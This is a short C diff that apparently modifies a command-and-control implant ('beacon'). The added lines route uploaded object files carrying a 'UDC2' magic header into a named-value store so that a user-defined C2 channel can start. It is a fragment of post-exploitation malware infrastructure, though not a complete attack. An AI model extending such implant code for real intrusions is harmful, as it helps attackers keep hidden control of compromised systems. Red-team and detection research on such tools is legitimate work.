@@ -312,6 +312,11 @@ void command_data_store(char * buffer, int length, void (*callback)(char * buffe
 			post_error_na(0x0d);
 			return;
 		}
+		/* tier-2 item6: a UDC2 BOF upload (magic header) also lands in
+		 * the named-value store so udc2_init can engage the channel */
+		if (blob.length > 12 && *(int *)blob.buffer == 0x32434455) {
+			BeaconAddValue("udc2", blob.buffer);
+		}
 		put_be32(out, (unsigned int)idx);
 		put_be64(out + 4, hash);
 		callback(out, 12, CALLBACK_DATA_STORE_ADD);
